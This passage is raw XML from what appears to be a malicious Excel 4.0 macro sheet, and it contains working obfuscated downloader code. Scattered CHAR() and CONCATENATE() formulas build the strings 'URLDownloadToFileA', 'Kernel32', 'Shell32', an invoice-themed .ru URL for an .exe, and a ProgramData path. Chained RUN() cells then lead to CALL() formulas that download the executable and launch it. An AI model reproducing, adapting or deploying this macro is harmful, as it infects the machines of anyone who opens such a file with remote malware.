        <v>l</v>
      </c>
      <c r="EU58" t="b">
        <f>RUN($AV$683)</f>
        <v>0</v>
      </c>
    </row>
    <row r="63" spans="52:203" x14ac:dyDescent="0.25">
      <c r="BT63">
        <v>84</v>
      </c>
      <c r="GQ63">
        <v>33</v>
      </c>
    </row>
    <row r="65" spans="30:229" x14ac:dyDescent="0.25">
      <c r="EJ65">
        <v>664</v>
      </c>
    </row>
    <row r="71" spans="30:229" x14ac:dyDescent="0.25">
      <c r="AD71" t="b">
        <f>RUN($R$1693)</f>
        <v>0</v>
      </c>
    </row>
    <row r="77" spans="30:229" x14ac:dyDescent="0.25">
      <c r="AQ77">
        <v>24</v>
      </c>
    </row>
    <row r="80" spans="30:229" x14ac:dyDescent="0.25">
      <c r="HU80" t="b">
        <f>RUN($DT$1068)</f>
        <v>0</v>
      </c>
    </row>
    <row r="83" spans="60:234" x14ac:dyDescent="0.25">
      <c r="HJ83">
        <v>32</v>
      </c>
    </row>
    <row r="86" spans="60:234" x14ac:dyDescent="0.25">
      <c r="HR86">
        <v>99</v>
      </c>
      <c r="HZ86">
        <v>673</v>
      </c>
    </row>
    <row r="91" spans="60:234" x14ac:dyDescent="0.25">
      <c r="BH91">
        <v>58</v>
      </c>
    </row>
    <row r="94" spans="60:234" x14ac:dyDescent="0.25">
      <c r="GO94" t="str">
        <f>CHAR($AX$1706-58)</f>
        <v>l</v>
      </c>
    </row>
    <row r="95" spans="60:234" x14ac:dyDescent="0.25">
      <c r="FJ95">
        <v>1047</v>
      </c>
    </row>
    <row r="100" spans="118:171" x14ac:dyDescent="0.25">
      <c r="FO100">
        <v>34</v>
      </c>
    </row>
    <row r="101" spans="118:171" x14ac:dyDescent="0.25">
      <c r="DW101" t="b">
        <f>RUN($EL$1415)</f>
        <v>0</v>
      </c>
    </row>
    <row r="102" spans="118:171" x14ac:dyDescent="0.25">
      <c r="DN102">
        <v>122</v>
      </c>
      <c r="EQ102">
        <v>1010</v>
      </c>
    </row>
    <row r="108" spans="118:171" x14ac:dyDescent="0.25">
      <c r="DV108">
        <v>43</v>
      </c>
    </row>
    <row r="111" spans="118:171" x14ac:dyDescent="0.25">
      <c r="DW111">
        <v>32</v>
      </c>
    </row>
    <row r="124" spans="75:222" x14ac:dyDescent="0.25">
      <c r="HB124" t="b">
        <f>RUN($HD$229)</f>
        <v>0</v>
      </c>
      <c r="HN124" t="str">
        <f>CHAR($GU$1486-563)</f>
        <v>p</v>
      </c>
    </row>
    <row r="127" spans="75:222" x14ac:dyDescent="0.25">
      <c r="BW127">
        <v>85</v>
      </c>
    </row>
    <row r="128" spans="75:222" x14ac:dyDescent="0.25">
      <c r="HM128">
        <v>49</v>
      </c>
    </row>
    <row r="130" spans="32:231" x14ac:dyDescent="0.25">
      <c r="BC130" t="b">
        <f>RUN($HC$1413)</f>
        <v>0</v>
      </c>
    </row>
    <row r="131" spans="32:231" x14ac:dyDescent="0.25">
      <c r="CI131">
        <v>33</v>
      </c>
    </row>
    <row r="132" spans="32:231" x14ac:dyDescent="0.25">
      <c r="CB132">
        <v>680</v>
      </c>
    </row>
    <row r="133" spans="32:231" x14ac:dyDescent="0.25">
      <c r="HR133">
        <v>30</v>
      </c>
    </row>
    <row r="134" spans="32:231" x14ac:dyDescent="0.25">
      <c r="FD134">
        <v>111</v>
      </c>
    </row>
    <row r="137" spans="32:231" x14ac:dyDescent="0.25">
      <c r="AF137">
        <v>7</v>
      </c>
    </row>
    <row r="138" spans="32:231" x14ac:dyDescent="0.25">
      <c r="HW138">
        <v>20</v>
      </c>
    </row>
    <row r="149" spans="48:236" x14ac:dyDescent="0.25">
      <c r="AV149" t="str">
        <f>CHAR($FA$633-14)</f>
        <v>r</v>
      </c>
    </row>
    <row r="152" spans="48:236" x14ac:dyDescent="0.25">
      <c r="FT152">
        <v>98</v>
      </c>
    </row>
    <row r="156" spans="48:236" x14ac:dyDescent="0.25">
      <c r="FM156">
        <v>6</v>
      </c>
    </row>
    <row r="158" spans="48:236" x14ac:dyDescent="0.25">
      <c r="CS158">
        <v>9</v>
      </c>
    </row>
    <row r="159" spans="48:236" x14ac:dyDescent="0.25">
      <c r="IB159" t="b">
        <f>RUN($AD$71)</f>
        <v>0</v>
      </c>
    </row>
    <row r="168" spans="14:188" x14ac:dyDescent="0.25">
      <c r="AI168">
        <v>39</v>
      </c>
      <c r="GF168">
        <v>660</v>
      </c>
    </row>
    <row r="174" spans="14:188" x14ac:dyDescent="0.25">
      <c r="CB174">
        <v>14</v>
      </c>
      <c r="CM174" t="str">
        <f>CHAR($BV$1922-14)</f>
        <v>a</v>
      </c>
    </row>
    <row r="176" spans="14:188" x14ac:dyDescent="0.25">
      <c r="N176">
        <v>685</v>
      </c>
    </row>
    <row r="185" spans="74:238" x14ac:dyDescent="0.25">
      <c r="BV185">
        <v>12</v>
      </c>
      <c r="CJ185">
        <v>99</v>
      </c>
    </row>
    <row r="186" spans="74:238" x14ac:dyDescent="0.25">
      <c r="ID186">
        <v>138</v>
      </c>
    </row>
    <row r="189" spans="74:238" x14ac:dyDescent="0.25">
      <c r="CA189" t="b">
        <f>RUN($DQ$738)</f>
        <v>0</v>
      </c>
    </row>
    <row r="190" spans="74:238" x14ac:dyDescent="0.25">
      <c r="GG190" t="b">
        <f>RUN($BF$4)</f>
        <v>0</v>
      </c>
    </row>
    <row r="193" spans="29:174" x14ac:dyDescent="0.25">
      <c r="DM193">
        <v>58</v>
      </c>
    </row>
    <row r="197" spans="29:174" x14ac:dyDescent="0.25">
      <c r="FR197">
        <v>159</v>
      </c>
    </row>
    <row r="207" spans="29:174" x14ac:dyDescent="0.25">
      <c r="AC207" t="str">
        <f>CHAR($CW$772-14)</f>
        <v>S</v>
      </c>
    </row>
    <row r="211" spans="6:246" x14ac:dyDescent="0.25">
      <c r="CV211">
        <v>62</v>
      </c>
    </row>
    <row r="212" spans="6:246" x14ac:dyDescent="0.25">
      <c r="CG212">
        <v>61</v>
      </c>
    </row>
    <row r="213" spans="6:246" x14ac:dyDescent="0.25">
      <c r="FU213" t="str">
        <f>CONCATENATE($GH$1016,$EC$812)</f>
        <v>http://invoice7mukszq9nbpa7online.ru/unfeminized.exe</v>
      </c>
      <c r="FY213" t="b">
        <f>RUN($DX$1383)</f>
        <v>0</v>
      </c>
    </row>
    <row r="214" spans="6:246" x14ac:dyDescent="0.25">
      <c r="R214" t="b">
        <f>RUN($AM$625)</f>
        <v>0</v>
      </c>
      <c r="DF214">
        <v>60</v>
      </c>
    </row>
    <row r="221" spans="6:246" x14ac:dyDescent="0.25">
      <c r="CP221">
        <v>150</v>
      </c>
      <c r="IL221">
        <v>79</v>
      </c>
    </row>
    <row r="222" spans="6:246" x14ac:dyDescent="0.25">
      <c r="IE222" t="b">
        <f>RUN($HB$124)</f>
        <v>0</v>
      </c>
    </row>
    <row r="224" spans="6:246" x14ac:dyDescent="0.25">
      <c r="F224">
        <v>0</v>
      </c>
    </row>
    <row r="229" spans="28:212" x14ac:dyDescent="0.25">
      <c r="HD229" t="b">
        <f>RUN($GW$1728)</f>
        <v>0</v>
      </c>
    </row>
    <row r="235" spans="28:212" x14ac:dyDescent="0.25">
      <c r="GL235">
        <v>27</v>
      </c>
    </row>
    <row r="236" spans="28:212" x14ac:dyDescent="0.25">
      <c r="AB236">
        <v>50</v>
      </c>
    </row>
    <row r="242" spans="8:239" x14ac:dyDescent="0.25">
      <c r="AN242" t="str">
        <f>CHAR($FA$1199-563)</f>
        <v>q</v>
      </c>
      <c r="ID242" t="b">
        <f>RUN($ES$925)</f>
        <v>0</v>
      </c>
    </row>
    <row r="244" spans="8:239" x14ac:dyDescent="0.25">
      <c r="EQ244" t="b">
        <f>RUN($HC$1964)</f>
        <v>0</v>
      </c>
      <c r="GI244">
        <v>664</v>
      </c>
    </row>
    <row r="246" spans="8:239" x14ac:dyDescent="0.25">
      <c r="GS246" t="b">
        <f>RUN($BR$1032)</f>
        <v>0</v>
      </c>
    </row>
    <row r="249" spans="8:239" x14ac:dyDescent="0.25">
      <c r="H249">
        <v>661</v>
      </c>
    </row>
    <row r="251" spans="8:239" x14ac:dyDescent="0.25">
      <c r="IE251">
        <v>48</v>
      </c>
    </row>
    <row r="257" spans="126:212" x14ac:dyDescent="0.25">
      <c r="DV257">
        <v>125</v>
      </c>
    </row>
    <row r="260" spans="126:212" x14ac:dyDescent="0.25">
      <c r="HD260">
        <v>32</v>
      </c>
    </row>
    <row r="273" spans="7:215" x14ac:dyDescent="0.25">
      <c r="T273">
        <v>1041</v>
      </c>
    </row>
    <row r="275" spans="7:215" x14ac:dyDescent="0.25">
      <c r="GY275" t="str">
        <f>CHAR($FD$134-14)</f>
        <v>a</v>
      </c>
    </row>
    <row r="278" spans="7:215" x14ac:dyDescent="0.25">
      <c r="EQ278">
        <v>133</v>
      </c>
    </row>
    <row r="280" spans="7:215" x14ac:dyDescent="0.25">
      <c r="BW280">
        <v>984</v>
      </c>
      <c r="CZ280">
        <v>22</v>
      </c>
      <c r="HG280">
        <v>125</v>
      </c>
    </row>
    <row r="282" spans="7:215" x14ac:dyDescent="0.25">
      <c r="BZ282">
        <v>1037</v>
      </c>
    </row>
    <row r="283" spans="7:215" x14ac:dyDescent="0.25">
      <c r="G283">
        <v>33</v>
      </c>
    </row>
    <row r="285" spans="7:215" x14ac:dyDescent="0.25">
      <c r="EV285">
        <v>1009</v>
      </c>
    </row>
    <row r="287" spans="7:215" x14ac:dyDescent="0.25">
      <c r="FW287">
        <v>17</v>
      </c>
    </row>
    <row r="289" spans="16:104" x14ac:dyDescent="0.25">
      <c r="P289">
        <v>20</v>
      </c>
    </row>
    <row r="292" spans="16:104" x14ac:dyDescent="0.25">
      <c r="CE292">
        <v>83</v>
      </c>
    </row>
    <row r="301" spans="16:104" x14ac:dyDescent="0.25">
      <c r="CZ301">
        <v>119</v>
      </c>
    </row>
    <row r="305" spans="9:208" x14ac:dyDescent="0.25">
      <c r="I305">
        <v>115</v>
      </c>
    </row>
    <row r="315" spans="9:208" x14ac:dyDescent="0.25">
      <c r="GZ315" t="str">
        <f>CHAR($BB$693-563)</f>
        <v>u</v>
      </c>
    </row>
    <row r="317" spans="9:208" x14ac:dyDescent="0.25">
      <c r="DQ317" t="str">
        <f>CHAR($J$364-58)</f>
        <v>p</v>
      </c>
    </row>
    <row r="320" spans="9:208" x14ac:dyDescent="0.25">
      <c r="CL320">
        <v>130</v>
      </c>
    </row>
    <row r="325" spans="48:191" x14ac:dyDescent="0.25">
      <c r="AV325" t="b">
        <f>RUN($EK$473)</f>
        <v>0</v>
      </c>
      <c r="FO325">
        <v>674</v>
      </c>
    </row>
    <row r="327" spans="48:191" x14ac:dyDescent="0.25">
      <c r="DV327" t="b">
        <f>RUN($GN$1218)</f>
        <v>0</v>
      </c>
    </row>
    <row r="330" spans="48:191" x14ac:dyDescent="0.25">
      <c r="EU330" t="str">
        <f>CHAR($FE$1741-14)</f>
        <v>n</v>
      </c>
    </row>
    <row r="331" spans="48:191" x14ac:dyDescent="0.25">
      <c r="EI331" t="str">
        <f>CHAR($CZ$301-14)</f>
        <v>i</v>
      </c>
    </row>
    <row r="333" spans="48:191" x14ac:dyDescent="0.25">
      <c r="GI333" t="str">
        <f>CHAR($GA$771-58)</f>
        <v>e</v>
      </c>
    </row>
    <row r="338" spans="73:210" x14ac:dyDescent="0.25">
      <c r="FS338">
        <v>4</v>
      </c>
    </row>
    <row r="341" spans="73:210" x14ac:dyDescent="0.25">
      <c r="FE341" t="b">
        <f>RUN($GF$1707)</f>
        <v>0</v>
      </c>
    </row>
    <row r="347" spans="73:210" x14ac:dyDescent="0.25">
      <c r="HB347" t="str">
        <f>CHAR($IB$1070-563)</f>
        <v>o</v>
      </c>
    </row>
    <row r="348" spans="73:210" x14ac:dyDescent="0.25">
      <c r="BU348" t="b">
        <f>RUN($IL$405)</f>
        <v>0</v>
      </c>
    </row>
    <row r="351" spans="73:210" x14ac:dyDescent="0.25">
      <c r="BX351">
        <v>24</v>
      </c>
    </row>
    <row r="353" spans="10:242" x14ac:dyDescent="0.25">
      <c r="AS353">
        <v>50</v>
      </c>
      <c r="IE353" t="str">
        <f>CHAR($CL$320-14)</f>
        <v>t</v>
      </c>
    </row>
    <row r="356" spans="10:242" x14ac:dyDescent="0.25">
      <c r="Z356">
        <v>51</v>
      </c>
    </row>
    <row r="357" spans="10:242" x14ac:dyDescent="0.25">
      <c r="BU357">
        <v>61</v>
      </c>
    </row>
    <row r="359" spans="10:242" x14ac:dyDescent="0.25">
      <c r="K359">
        <v>11</v>
      </c>
      <c r="IH359">
        <v>60</v>
      </c>
    </row>
    <row r="363" spans="10:242" x14ac:dyDescent="0.25">
      <c r="FM363">
        <v>39</v>
      </c>
    </row>
    <row r="364" spans="10:242" x14ac:dyDescent="0.25">
      <c r="J364">
        <v>170</v>
      </c>
      <c r="HQ364" t="str">
        <f>CHAR($GA$1040-563)</f>
        <v>e</v>
      </c>
    </row>
    <row r="365" spans="10:242" x14ac:dyDescent="0.25">
      <c r="HX365" t="str">
        <f>CHAR($HD$1349-563)</f>
        <v>.</v>
      </c>
    </row>
    <row r="372" spans="28:223" x14ac:dyDescent="0.25">
      <c r="AB372" t="str">
        <f>CHAR($DN$102-14)</f>
        <v>l</v>
      </c>
    </row>
    <row r="377" spans="28:223" x14ac:dyDescent="0.25">
      <c r="DY377" t="str">
        <f>CHAR($I$305-14)</f>
        <v>e</v>
      </c>
      <c r="FN377" t="b">
        <f>RUN($A$1986)</f>
        <v>0</v>
      </c>
      <c r="HO377" t="str">
        <f>CHAR($CP$221-58)</f>
        <v>\</v>
      </c>
    </row>
    <row r="379" spans="28:223" x14ac:dyDescent="0.25">
      <c r="BW379" t="str">
        <f>CONCATENATE($CG$825,$AO$1011,$BZ$1997,$EL$1510,$DT$1276,$GJ$448,$U$1339,$AE$1237)</f>
        <v>Kernel32</v>
      </c>
    </row>
    <row r="382" spans="28:223" x14ac:dyDescent="0.25">
      <c r="DQ382">
        <v>70</v>
      </c>
    </row>
    <row r="383" spans="28:223" x14ac:dyDescent="0.25">
      <c r="FQ383" t="str">
        <f>CHAR($EI$1355-14)</f>
        <v>C</v>
      </c>
    </row>
    <row r="385" spans="93:214" x14ac:dyDescent="0.25">
      <c r="FK385">
        <v>54</v>
      </c>
    </row>
    <row r="395" spans="93:214" x14ac:dyDescent="0.25">
      <c r="CO395">
        <v>23</v>
      </c>
    </row>
    <row r="397" spans="93:214" x14ac:dyDescent="0.25">
      <c r="HF397" t="str">
        <f>CONCATENATE($IA$1812)</f>
        <v>Shell32</v>
      </c>
    </row>
    <row r="399" spans="93:214" x14ac:dyDescent="0.25">
      <c r="EB399" t="str">
        <f>CONCATENATE($CA$1929)</f>
        <v>C:\ProgramData\plaukbp.exe</v>
      </c>
    </row>
    <row r="404" spans="74:246" x14ac:dyDescent="0.25">
      <c r="BV404">
        <v>12</v>
      </c>
    </row>
    <row r="405" spans="74:246" x14ac:dyDescent="0.25">
      <c r="IL405" t="b">
        <f>RUN($HG$851)</f>
        <v>0</v>
      </c>
    </row>
    <row r="408" spans="74:246" x14ac:dyDescent="0.25">
      <c r="ID408">
        <v>115</v>
      </c>
    </row>
    <row r="421" spans="2:242" x14ac:dyDescent="0.25">
      <c r="B421">
        <v>39</v>
      </c>
      <c r="IH421">
        <v>83</v>
      </c>
    </row>
    <row r="424" spans="2:242" x14ac:dyDescent="0.25">
      <c r="DI424" t="b">
        <f>RUN($ID$242)</f>
        <v>0</v>
      </c>
    </row>
    <row r="432" spans="2:242" x14ac:dyDescent="0.25">
      <c r="DC432" t="b">
        <f>RUN($BA$685)</f>
        <v>0</v>
      </c>
    </row>
    <row r="433" spans="21:192" x14ac:dyDescent="0.25">
      <c r="DC433" t="str">
        <f>CHAR($DS$606-58)</f>
        <v>.</v>
      </c>
    </row>
    <row r="436" spans="21:192" x14ac:dyDescent="0.25">
      <c r="FG436">
        <v>87</v>
      </c>
      <c r="FX436">
        <v>34</v>
      </c>
    </row>
    <row r="437" spans="21:192" x14ac:dyDescent="0.25">
      <c r="U437" t="str">
        <f>CHAR($R$1848-14)</f>
        <v>A</v>
      </c>
    </row>
    <row r="448" spans="21:192" x14ac:dyDescent="0.25">
      <c r="GJ448" t="str">
        <f>CHAR($T$273-933)</f>
        <v>l</v>
      </c>
    </row>
    <row r="450" spans="8:236" x14ac:dyDescent="0.25">
      <c r="BH450" t="str">
        <f>CHAR($HG$280-14)</f>
        <v>o</v>
      </c>
      <c r="BW450" t="b">
        <f>RUN($CS$1270)</f>
        <v>0</v>
      </c>
    </row>
    <row r="455" spans="8:236" x14ac:dyDescent="0.25">
      <c r="DQ455">
        <v>19</v>
      </c>
      <c r="IB455" t="str">
        <f>CHAR($B$1039-563)</f>
        <v>t</v>
      </c>
    </row>
    <row r="456" spans="8:236" x14ac:dyDescent="0.25">
      <c r="GI456">
        <v>76</v>
      </c>
    </row>
    <row r="457" spans="8:236" x14ac:dyDescent="0.25">
      <c r="H457">
        <v>85</v>
      </c>
      <c r="DF457" t="str">
        <f>CONCATENATE($BB$1077,$CR$1594,$DZ$1934,$FC$1773,$HE$1482,$FA$953,$EY$917,$EX$1758,$HK$1022,$GY$275,$Q$1871,$HS$800,$BH$450,$FX$1416,$EI$331,$AZ$58,$FO$649,$AT$1344)</f>
        <v>URLDownloadToFileA</v>
      </c>
    </row>
    <row r="458" spans="8:236" x14ac:dyDescent="0.25">
      <c r="HL458">
        <v>680</v>
      </c>
    </row>
    <row r="459" spans="8:236" x14ac:dyDescent="0.25">
      <c r="BD459">
        <v>1015</v>
      </c>
    </row>
    <row r="466" spans="20:240" x14ac:dyDescent="0.25">
      <c r="IF466">
        <v>0</v>
      </c>
    </row>
    <row r="467" spans="20:240" x14ac:dyDescent="0.25">
      <c r="BG467">
        <v>59</v>
      </c>
    </row>
    <row r="472" spans="20:240" x14ac:dyDescent="0.25">
      <c r="AK472">
        <v>17</v>
      </c>
    </row>
    <row r="473" spans="20:240" x14ac:dyDescent="0.25">
      <c r="EK473" t="b">
        <f>RUN($FO$1339)</f>
        <v>0</v>
      </c>
    </row>
    <row r="477" spans="20:240" x14ac:dyDescent="0.25">
      <c r="T477" t="b">
        <f>RUN($HU$868)</f>
        <v>0</v>
      </c>
    </row>
    <row r="478" spans="20:240" x14ac:dyDescent="0.25">
      <c r="AY478">
        <v>86</v>
      </c>
    </row>
    <row r="484" spans="46:223" x14ac:dyDescent="0.25">
      <c r="AT484">
        <v>610</v>
      </c>
      <c r="HL484">
        <v>13</v>
      </c>
    </row>
    <row r="488" spans="46:223" x14ac:dyDescent="0.25">
      <c r="CP488">
        <v>51</v>
      </c>
    </row>
    <row r="490" spans="46:223" x14ac:dyDescent="0.25">
      <c r="HO490">
        <v>13</v>
      </c>
    </row>
    <row r="491" spans="46:223" x14ac:dyDescent="0.25">
      <c r="CC491">
        <v>125</v>
      </c>
    </row>
    <row r="492" spans="46:223" x14ac:dyDescent="0.25">
      <c r="EP492">
        <v>167</v>
      </c>
    </row>
    <row r="498" spans="23:203" x14ac:dyDescent="0.25">
      <c r="BE498">
        <v>46</v>
      </c>
    </row>
    <row r="499" spans="23:203" x14ac:dyDescent="0.25">
      <c r="EN499" t="str">
        <f>CHAR($EV$285-933)</f>
        <v>L</v>
      </c>
    </row>
    <row r="500" spans="23:203" x14ac:dyDescent="0.25">
      <c r="GU500" t="b">
        <f>RUN($DC$432)</f>
        <v>0</v>
      </c>
    </row>
    <row r="506" spans="23:203" x14ac:dyDescent="0.25">
      <c r="BA506">
        <v>28</v>
      </c>
      <c r="FV506">
        <v>15</v>
      </c>
    </row>
    <row r="508" spans="23:203" x14ac:dyDescent="0.25">
      <c r="DV508">
        <v>40</v>
      </c>
    </row>
    <row r="511" spans="23:203" x14ac:dyDescent="0.25">
      <c r="W511">
        <v>664</v>
      </c>
    </row>
    <row r="513" spans="70:216" x14ac:dyDescent="0.25">
      <c r="GY513">
        <v>28</v>
      </c>
    </row>
    <row r="516" spans="70:216" x14ac:dyDescent="0.25">
      <c r="BR516" t="str">
        <f>CHAR($H$249-563)</f>
        <v>b</v>
      </c>
    </row>
    <row r="520" spans="70:216" x14ac:dyDescent="0.25">
      <c r="HH520" t="b">
        <f>RUN($EE$1378)</f>
        <v>0</v>
      </c>
    </row>
    <row r="523" spans="70:216" x14ac:dyDescent="0.25">
      <c r="GU523">
        <v>90</v>
      </c>
    </row>
    <row r="533" spans="86:239" x14ac:dyDescent="0.25">
      <c r="IE533" t="b">
        <f>RUN($IB$1833)</f>
        <v>0</v>
      </c>
    </row>
    <row r="542" spans="86:239" x14ac:dyDescent="0.25">
      <c r="CH542" t="b">
        <f>RUN($CU$1859)</f>
        <v>0</v>
      </c>
      <c r="CV542">
        <v>18</v>
      </c>
    </row>
    <row r="547" spans="36:245" x14ac:dyDescent="0.25">
      <c r="BR547">
        <v>51</v>
      </c>
    </row>
    <row r="548" spans="36:245" x14ac:dyDescent="0.25">
      <c r="ET548">
        <v>89</v>
      </c>
    </row>
    <row r="554" spans="36:245" x14ac:dyDescent="0.25">
      <c r="AJ554">
        <v>130</v>
      </c>
      <c r="IK554">
        <v>672</v>
      </c>
    </row>
    <row r="563" spans="2:244" x14ac:dyDescent="0.25">
      <c r="HE563">
        <v>82</v>
      </c>
      <c r="IJ563" t="str">
        <f>CHAR($BD$459-933)</f>
        <v>R</v>
      </c>
    </row>
    <row r="564" spans="2:244" x14ac:dyDescent="0.25">
      <c r="CG564" t="b">
        <f>RUN($AB$1423)</f>
        <v>0</v>
      </c>
      <c r="CZ564" t="b">
        <f>RUN($CH$1448)</f>
        <v>0</v>
      </c>
      <c r="DR564">
        <v>672</v>
      </c>
    </row>
    <row r="565" spans="2:244" x14ac:dyDescent="0.25">
      <c r="FG565" t="str">
        <f>CHAR($EF$572-933)</f>
        <v>l</v>
      </c>
    </row>
    <row r="567" spans="2:244" x14ac:dyDescent="0.25">
      <c r="BR567" t="str">
        <f>CHAR($AC$1794-58)</f>
        <v>a</v>
      </c>
    </row>
    <row r="569" spans="2:244" x14ac:dyDescent="0.25">
      <c r="B569" t="b">
        <f>RUN($BA$1159)</f>
        <v>0</v>
      </c>
    </row>
    <row r="572" spans="2:244" x14ac:dyDescent="0.25">
      <c r="EF572">
        <v>1041</v>
      </c>
    </row>
    <row r="573" spans="2:244" x14ac:dyDescent="0.25">
      <c r="HE573">
        <v>52</v>
      </c>
    </row>
    <row r="574" spans="2:244" x14ac:dyDescent="0.25">
      <c r="GB574">
        <v>30</v>
      </c>
    </row>
    <row r="576" spans="2:244" x14ac:dyDescent="0.25">
      <c r="E576" t="b">
        <f>RUN($GR$1414)</f>
        <v>0</v>
      </c>
    </row>
    <row r="582" spans="9:206" x14ac:dyDescent="0.25">
      <c r="FJ582">
        <v>19</v>
      </c>
    </row>
    <row r="585" spans="9:206" x14ac:dyDescent="0.25">
      <c r="AU585">
        <v>1011</v>
      </c>
      <c r="GX585">
        <v>130</v>
      </c>
    </row>
    <row r="586" spans="9:206" x14ac:dyDescent="0.25">
      <c r="DX586">
        <v>49</v>
      </c>
    </row>
    <row r="587" spans="9:206" x14ac:dyDescent="0.25">
      <c r="I587">
        <v>44</v>
      </c>
    </row>
    <row r="588" spans="9:206" x14ac:dyDescent="0.25">
      <c r="BZ588" t="str">
        <f>CHAR($ED$1164-14)</f>
        <v>r</v>
      </c>
    </row>
    <row r="595" spans="65:162" x14ac:dyDescent="0.25">
      <c r="BM595">
        <v>119</v>
      </c>
    </row>
    <row r="599" spans="65:162" x14ac:dyDescent="0.25">
      <c r="CE599">
        <v>64</v>
      </c>
      <c r="DI599">
        <v>53</v>
      </c>
      <c r="FF599">
        <v>983</v>
      </c>
    </row>
    <row r="600" spans="65:162" x14ac:dyDescent="0.25">
      <c r="ES600">
        <v>12</v>
      </c>
    </row>
    <row r="606" spans="65:162" x14ac:dyDescent="0.25">
      <c r="DS606">
        <v>104</v>
      </c>
    </row>
    <row r="610" spans="7:203" x14ac:dyDescent="0.25">
      <c r="N610">
        <v>60</v>
      </c>
    </row>
    <row r="612" spans="7:203" x14ac:dyDescent="0.25">
      <c r="DS612">
        <v>19</v>
      </c>
      <c r="GU612" t="str">
        <f>CHAR($AF$1058-563)</f>
        <v>s</v>
      </c>
    </row>
    <row r="614" spans="7:203" x14ac:dyDescent="0.25">
      <c r="G614">
        <v>76</v>
      </c>
    </row>
    <row r="623" spans="7:203" x14ac:dyDescent="0.25">
      <c r="BJ623" t="str">
        <f>CHAR($Y$1761-933)</f>
        <v>3</v>
      </c>
    </row>
    <row r="625" spans="11:205" x14ac:dyDescent="0.25">
      <c r="AM625" t="b">
        <f>RUN($BL$1476)</f>
        <v>0</v>
      </c>
      <c r="GE625">
        <v>30</v>
      </c>
    </row>
    <row r="631" spans="11:205" x14ac:dyDescent="0.25">
      <c r="AX631" t="str">
        <f>CHAR($AU$585-933)</f>
        <v>N</v>
      </c>
    </row>
    <row r="632" spans="11:205" x14ac:dyDescent="0.25">
      <c r="DE632">
        <v>8</v>
      </c>
      <c r="FM632">
        <v>155</v>
      </c>
    </row>
    <row r="633" spans="11:205" x14ac:dyDescent="0.25">
      <c r="FA633">
        <v>128</v>
      </c>
      <c r="GW633">
        <v>42</v>
      </c>
    </row>
    <row r="634" spans="11:205" x14ac:dyDescent="0.25">
      <c r="FZ634">
        <v>86</v>
      </c>
    </row>
    <row r="636" spans="11:205" x14ac:dyDescent="0.25">
      <c r="DY636" t="b">
        <f>RUN($CF$1101)</f>
        <v>0</v>
      </c>
    </row>
    <row r="639" spans="11:205" x14ac:dyDescent="0.25">
      <c r="K639" t="str">
        <f>CHAR($FH$1173-563)</f>
        <v>n</v>
      </c>
      <c r="GP639">
        <v>1012</v>
      </c>
    </row>
    <row r="643" spans="19:184" x14ac:dyDescent="0.25">
      <c r="GB643" t="b">
        <f>RUN($HH$520)</f>
        <v>0</v>
      </c>
    </row>
    <row r="649" spans="19:184" x14ac:dyDescent="0.25">
      <c r="FO649" t="str">
        <f>CHAR($M$1298-14)</f>
        <v>e</v>
      </c>
    </row>
    <row r="654" spans="19:184" x14ac:dyDescent="0.25">
      <c r="S654" t="b">
        <f>RUN($HU$80)</f>
        <v>0</v>
      </c>
    </row>
    <row r="655" spans="19:184" x14ac:dyDescent="0.25">
      <c r="EY655" t="str">
        <f>CHAR($EE$1242-58)</f>
        <v>r</v>
      </c>
    </row>
    <row r="659" spans="17:204" x14ac:dyDescent="0.25">
      <c r="BL659">
        <v>150</v>
      </c>
    </row>
    <row r="664" spans="17:204" x14ac:dyDescent="0.25">
      <c r="BB664" t="b">
        <f>RUN($CF$1278)</f>
        <v>0</v>
      </c>
    </row>
    <row r="666" spans="17:204" x14ac:dyDescent="0.25">
      <c r="GV666">
        <v>97</v>
      </c>
    </row>
    <row r="669" spans="17:204" x14ac:dyDescent="0.25">
      <c r="DI669">
        <v>24</v>
      </c>
    </row>
    <row r="670" spans="17:204" x14ac:dyDescent="0.25">
      <c r="Q670">
        <v>18</v>
      </c>
    </row>
    <row r="671" spans="17:204" x14ac:dyDescent="0.25">
      <c r="ED671">
        <v>610</v>
      </c>
    </row>
    <row r="683" spans="24:243" x14ac:dyDescent="0.25">
      <c r="AV683" t="b">
        <f>RUN($R$214)</f>
        <v>0</v>
      </c>
    </row>
    <row r="684" spans="24:243" x14ac:dyDescent="0.25">
      <c r="GK684">
        <v>81</v>
      </c>
    </row>
    <row r="685" spans="24:243" x14ac:dyDescent="0.25">
      <c r="BA685" t="b">
        <f>RUN($DX$1680)</f>
        <v>0</v>
      </c>
      <c r="DS685">
        <v>32</v>
      </c>
    </row>
    <row r="687" spans="24:243" x14ac:dyDescent="0.25">
      <c r="X687">
        <v>668</v>
      </c>
      <c r="II687">
        <v>73</v>
      </c>
    </row>
    <row r="688" spans="24:243" x14ac:dyDescent="0.25">
      <c r="CQ688" t="b">
        <f>RUN($BU$348)</f>
        <v>0</v>
      </c>
    </row>
    <row r="693" spans="19:218" x14ac:dyDescent="0.25">
      <c r="BB693">
        <v>680</v>
      </c>
    </row>
    <row r="694" spans="19:218" x14ac:dyDescent="0.25">
      <c r="CE694">
        <v>88</v>
      </c>
    </row>
    <row r="698" spans="19:218" x14ac:dyDescent="0.25">
      <c r="DS698" t="b">
        <f>RUN($DD$716)</f>
        <v>0</v>
      </c>
      <c r="HJ698" t="str">
        <f>CHAR($FW$1633-58)</f>
        <v>g</v>
      </c>
    </row>
    <row r="699" spans="19:218" x14ac:dyDescent="0.25">
      <c r="FW699" t="str">
        <f>CHAR($FF$599-933)</f>
        <v>2</v>
      </c>
    </row>
    <row r="700" spans="19:218" x14ac:dyDescent="0.25">
      <c r="S700">
        <v>73</v>
      </c>
    </row>
    <row r="718" spans="108:217" x14ac:dyDescent="0.25">
      <c r="HA718">
        <v>28</v>
      </c>
      <c r="HI718">
        <v>41</v>
      </c>
    </row>
    <row r="719" spans="108:217" x14ac:dyDescent="0.25">
      <c r="DD719" t="b">
        <f>CALL($GO$1428,$BS$1929, "JJCCJJ",0,$BB$54,$EB$399,0,0)</f>
        <v>0</v>
      </c>
    </row>
    <row r="720" spans="108:217" x14ac:dyDescent="0.25">
      <c r="DD720" t="b">
        <f>CALL($HF$397,$IE$1139, "JJCCCCJ",0,$FL$31,$EB$399,,0,0)</f>
        <v>0</v>
      </c>
    </row>
    <row r="722" spans="75:216" x14ac:dyDescent="0.25">
      <c r="BW722" t="str">
        <f>CHAR($AJ$554-14)</f>
        <v>t</v>
      </c>
    </row>
    <row r="725" spans="75:216" x14ac:dyDescent="0.25">
      <c r="DD725" t="b">
        <f>HALT()</f>
        <v>0</v>
      </c>
    </row>
    <row r="726" spans="75:216" x14ac:dyDescent="0.25">
